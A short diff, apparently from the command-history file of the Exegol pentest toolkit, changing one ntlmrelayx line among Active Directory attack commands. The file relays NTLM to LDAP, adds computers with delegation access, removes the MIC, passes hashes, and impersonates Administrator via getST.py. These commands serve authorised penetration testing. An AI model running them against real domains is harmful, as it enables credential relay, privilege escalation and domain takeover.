@@ -57,7 +57,7 @@ ntlmrelayx -t ldap://"$DC_HOST" -smb2support --escalate-user 'EXEGOL-01$'
 ntlmrelayx -t ldap://"$DC_HOST" -smb2support --interactive
 ntlmrelayx -t ldaps://"$DC_HOST" -smb2support --add-computer 'EXEGOL-01' 'exegol4thewin' --delegate-access
 ntlmrelayx -t ldaps://"$DC_HOST" -smb2support --remove-mic --add-computer 'EXEGOL-01' 'exegol4thewin' --delegate-access
-ntlmrelayx -tf targets.txt -w --ipv6 -smb2support -socks --lootdir ntlmrelayx_lootdir
+ntlmrelayx -tf targets.txt -w --ipv6 -smb2support --lootdir ntlmrelayx_lootdir --http-port 3128,80
 lookupsid.py -hashes :"$NT_HASH" "$DOMAIN"/Administrator@"$DC_HOST" 0
 getST.py -spn "host/$TARGET" -impersonate 'domainadmin' -dc-ip "$DC_IP" "$DOMAIN"/'EXEGOL-01$':'exegol4thewin'
 getST.py -spn CIFS/"$TARGET" -impersonate Administrator -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"
